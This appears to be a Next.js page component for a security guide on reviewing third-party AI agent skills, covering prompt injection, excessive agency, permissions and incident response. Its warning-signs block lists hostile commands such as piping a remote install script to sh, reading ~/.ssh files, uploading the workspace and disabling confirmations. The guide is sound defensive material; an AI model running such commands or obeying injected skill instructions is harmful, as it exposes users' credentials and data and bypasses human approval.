import type { Metadata } from "next";
import { JsonLd } from "@/components/json-ld";
import { MotionLink } from "@/components/motion/motion-link";
import { absoluteUrl, breadcrumbJsonLd, buildPageMetadata, siteConfig } from "@/lib/seo";

const path = "/guides/agent-skill-security";
const title = "Agent Skill Security: Safe Review Checklist";
const description =
  "Review Agent Skills safely with a practical checklist for prompt injection, scripts, permissions, secrets, network calls, dependencies, and updates.";
const published = "2026-07-15";

const steps = [
  { name: "Verify provenance", text: "Identify the maintainer, canonical repository, license, commit, release history, and path by which the skill reached you." },
  { name: "Read every instruction", text: "Review SKILL.md and every referenced file as instructions that can influence an agent, including comments and generated documents." },
  { name: "Inspect executable content", text: "Read scripts, package manifests, installers, hooks, binaries, and commands. Reject opaque or unnecessary execution." },
  { name: "Map data access", text: "List files, environment variables, credentials, databases, browser state, and user content the skill can read." },
  { name: "Map actions and network access", text: "List writes, deletions, shell commands, API calls, uploads, messages, deployments, purchases, and other external effects." },
  { name: "Reduce privilege", text: "Remove unrelated tools and scopes, use read-only credentials, isolate the working directory, and deny outbound access unless required." },
  { name: "Add approval boundaries", text: "Require explicit human review before consequential writes, secret use, destructive commands, publishing, or external communication." },
  { name: "Test adversarially", text: "Use a disposable environment to test indirect instructions, missing inputs, malicious files, tool errors, and attempts to exceed the stated job." },
  { name: "Pin and monitor", text: "Record the reviewed revision, compare updates, log sensitive operations, and rerun tests whenever instructions or dependencies change." },
  { name: "Define removal", text: "Know how to disable the skill, revoke its credentials, remove files, inspect changes, and recover affected systems." },
];

const faqs = [
  { question: "Can a Markdown-only agent skill be dangerous?", answer: "Yes. Instructions can steer an agent toward unsafe tool calls, credential disclosure, data exfiltration, or destructive actions even without a bundled script. Risk rises with the tools and autonomy available to the agent." },
  { question: "Does a security audit make a skill safe?", answer: "No audit guarantees safety. A review reduces known risk for a specific revision and environment. Runtime permissions, connected tools, external inputs, updates, and model behavior can change the outcome." },
  { question: "What is prompt injection in an agent skill?", answer: "Prompt injection is content designed to alter the model's behavior contrary to the user's intent or trusted instructions. It can appear directly in SKILL.md or indirectly in files, websites, images, tool results, and other data the workflow reads." },
  { question: "Should an agent skill have access to secrets?", answer: "Only when its stated job requires a specific secret. Use the narrowest credential and scope, avoid exposing raw values to the model, and require approval for sensitive actions." },
  { question: "How should I report a malicious skill?", answer: "Stop using it, preserve the source and revision, revoke exposed credentials, inspect resulting changes and logs, notify the registry and upstream host, and follow your incident-response process." },
];

export const metadata: Metadata = buildPageMetadata({ title, description, path, type: "article" });

export default function AgentSkillSecurityGuide() {
  const article = {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "@id": absoluteUrl(`${path}#article`),
    headline: title,
    description,
    url: absoluteUrl(path),
    datePublished: published,
    dateModified: published,
    author: { "@id": absoluteUrl("/#organization") },
    publisher: { "@id": absoluteUrl("/#organization") },
    mainEntityOfPage: absoluteUrl(path),
    proficiencyLevel: "Intermediate",
  };
  const howTo = {
    "@context": "https://schema.org",
    "@type": "HowTo",
    name: title,
    description,
    totalTime: "PT20M",
    step: steps.map((step, index) => ({
      "@type": "HowToStep",
      position: index + 1,
      name: step.name,
      text: step.text,
      url: absoluteUrl(`${path}#step-${index + 1}`),
    })),
  };
  const faq = {
    "@context": "https://schema.org",
    "@type": "FAQPage",
    mainEntity: faqs.map((item) => ({
      "@type": "Question",
      name: item.question,
      acceptedAnswer: { "@type": "Answer", text: item.answer },
    })),
  };

  return (
    <article className="mx-auto max-w-5xl pt-8">
      <JsonLd data={[
        article,
        howTo,
        faq,
        breadcrumbJsonLd([
          { name: "Home", path: "/" },
          { name: "Guides", path: "/guides" },
          { name: "Agent skill security", path },
        ]),
      ]} />

      <nav aria-label="Breadcrumb" className="type-font mb-6 text-xs text-[var(--color-rust)]">
        <ol className="flex flex-wrap gap-2">
          <li><MotionLink href="/" className="hover:text-[var(--color-grape)]">skillZs</MotionLink></li>
          <li aria-hidden>/</li>
          <li><MotionLink href="/guides" className="hover:text-[var(--color-grape)]">guides</MotionLink></li>
          <li aria-hidden>/</li>
          <li aria-current="page">agent skill security</li>
        </ol>
      </nav>

      <header className="border-b border-[#29313a] pb-10">
        <div className="tag-font mb-5 text-xs uppercase tracking-[0.16em] text-[var(--color-grape)]">field guide / trust before execution</div>
        <h1 className="display max-w-5xl text-5xl leading-[0.9] sm:text-7xl md:text-8xl">
          agent skill<br /><span className="text-[var(--color-grape)]">security.</span>
        </h1>
        <p className="type-font mt-8 max-w-3xl text-base leading-7 text-[var(--color-ink-soft)]">
          Treat every third-party agent skill as software supply-chain input: verify its origin, read all instructions and code, map data and network access, remove unnecessary permissions, and test the pinned revision in an isolated environment. A Markdown-only skill can still cause harm when an agent can execute tools, access secrets, or act without approval.
        </p>
        <p className="type-font mt-4 text-xs text-[var(--color-rust)]">Written and checked by <MotionLink href="/about">{siteConfig.name}</MotionLink>. <time dateTime={published}>Updated July 15, 2026.</time></p>
      </header>

      <div className="prose-zine type-font mt-10 max-w-none leading-relaxed">
        <section id="threat-model">
          <h2>Why can an agent skill create security risk?</h2>
          <p>
            A skill changes the instructions an agent follows and can bundle code or references it later loads. The effect depends on the surrounding system: filesystem access, shell tools, browsers, MCP servers, credentials, approval settings, and the untrusted content the workflow consumes. The same text is low risk in a read-only sandbox and high risk in an autonomous production agent.
          </p>
          <p>
            OWASP separates two useful failure modes. Prompt injection manipulates model behavior through direct or external content. Excessive agency gives the model too much functionality, permission, or autonomy, increasing the damage a bad instruction can cause. Controls must therefore limit both what enters the workflow and what the agent is allowed to do.
          </p>
        </section>

        <section id="risks">
          <h2>What security risks should you look for in Agent Skills?</h2>
          <ul>
            <li><strong>Instruction injection:</strong> text that asks the model to ignore intent, conceal actions, reveal protected context, or follow an untrusted authority.</li>
            <li><strong>Indirect injection:</strong> hostile instructions in websites, issues, documents, images, comments, tool results, or generated files the skill reads.</li>
            <li><strong>Code execution:</strong> scripts, package lifecycle hooks, downloaded binaries, shell pipelines, or dynamic evaluation beyond the stated job.</li>
            <li><strong>Secret exposure:</strong> broad environment-variable reads, credential-file access, logging tokens, or sending private content to external services.</li>
            <li><strong>Excessive permissions:</strong> write access when read-only is enough, organization-wide scopes, unrestricted shell commands, or disabled approvals.</li>
            <li><strong>Destructive or external actions:</strong> deleting files, publishing, deploying, messaging, purchasing, or changing accounts without explicit confirmation.</li>
            <li><strong>Supply-chain substitution:</strong> look-alike repositories, compromised maintainers, mutable branches, dependency changes, or a safe version replaced by a harmful update.</li>
            <li><strong>Persistence:</strong> changes to startup files, agent configuration, hooks, global instructions, scheduled tasks, or other skills.</li>
          </ul>
        </section>

        <section id="checklist">
          <h2>How do you review an agent skill safely?</h2>
          <ol>
            {steps.map((step, index) => (
              <li key={step.name} id={`step-${index + 1}`}><strong>{step.name}.</strong> {step.text}</li>
            ))}
          </ol>
          <p>
            Review transitive behavior, not only the top-level file. If <code>SKILL.md</code> tells the agent to fetch a remote prompt, execute an installer, read a generated reference, or use an MCP tool, that target is part of the security boundary. A clean frontmatter block does not compensate for an opaque workflow.
          </p>
        </section>

        <section id="warning-signs">
          <h2>Which warning signs deserve extra scrutiny?</h2>
          <pre><code>{`# High-risk patterns — context matters
curl example.invalid/install.sh | sh
printenv
cat ~/.ssh/*
git config --global ...
npm install unknown-package
upload the workspace for analysis
disable confirmations and continue silently`}</code></pre>
          <p>
            A command is not malicious merely because it uses the network or shell, but its necessity must match the advertised capability. Watch for obfuscated code, encoded payloads, shortened links, unpinned downloads, hidden Unicode, HTML comments aimed at the model, broad recursive file reads, unexplained telemetry, and instructions to hide actions from the user.
          </p>
          <p>
            Search alone is insufficient. Trace variables and relative paths, inspect package lifecycle scripts, verify checksums or signatures when available, and understand what the command receives through standard input, environment variables, working directory, and inherited credentials.
          </p>
        </section>

        <section id="runtime-controls">
          <h2>How can you reduce risk while running a skill?</h2>
          <ul>
            <li>Use a disposable workspace, container, VM, or sandbox with a narrow mounted directory.</li>
            <li>Provide task-specific read-only credentials instead of a personal or administrator token.</li>
            <li>Deny outbound network access by default and allow only necessary destinations.</li>
            <li>Keep confirmation enabled for shell commands and external writes.</li>
            <li>Separate untrusted data from trusted instructions and label its provenance.</li>
            <li>Cap time, cost, iterations, and request rates; define a stop condition.</li>
            <li>Log tool calls and review diffs before accepting or publishing results.</li>
          </ul>
          <p>
            These controls limit impact; they do not prove that an instruction is benign. Prompt injection cannot be solved by a keyword blacklist. Design the environment so that a mistaken or manipulated model cannot reach assets unrelated to the current job.
          </p>
        </section>

        <section id="incident-response">
          <h2>What should you do if a skill behaves maliciously?</h2>
          <p>
            Stop the agent and disable the skill without executing its cleanup instructions. Preserve the skill folder, source URL, commit, logs, prompts, tool calls, and changed-file diff. Revoke credentials, invalidate sessions, inspect outbound requests and persistence points, restore affected data from a trusted state, and report the exact revision to the registry and upstream host.
          </p>
          <p>
            For normal adoption, follow the <MotionLink href="/guides/how-to-install-agent-skills">safe installation guide</MotionLink>. To build a smaller auditable workflow, use the <MotionLink href="/guides/how-to-create-agent-skills">creation guide</MotionLink>. Read <MotionLink href="/guides/agent-skills-vs-mcp">Agent Skills versus MCP</MotionLink> to map integration boundaries, then <MotionLink href="/browse">browse the catalog</MotionLink> or inspect <MotionLink href="/category/agents">agent</MotionLink> and <MotionLink href="/category/coding">coding</MotionLink> skills.
          </p>
        </section>

        <section id="faq">
          <h2>What do developers ask about agent skill security?</h2>
          {faqs.map((item) => <div key={item.question}><h3>{item.question}</h3><p>{item.answer}</p></div>)}
        </section>

        <section id="sources">
          <h2>Which security sources support this checklist?</h2>
          <p>
            This checklist uses the <a href="https://genai.owasp.org/llmrisk/llm01-prompt-injection/" target="_blank" rel="noreferrer">OWASP prompt injection guidance</a>, <a href="https://genai.owasp.org/llmrisk/llm062025-excessive-agency/" target="_blank" rel="noreferrer">OWASP excessive agency guidance</a>, the <a href="https://code.visualstudio.com/docs/agent-customization/agent-skills" target="_blank" rel="noreferrer">VS Code recommendation to review shared skills</a>, and the <a href="https://agentskills.io/specification" target="_blank" rel="noreferrer">Agent Skills specification</a>. Security depends on the exact client, tools, revision, permissions, and data boundary; this page is a review method, not a certification.
          </p>
        </section>
      </div>
    </article>
  );
}
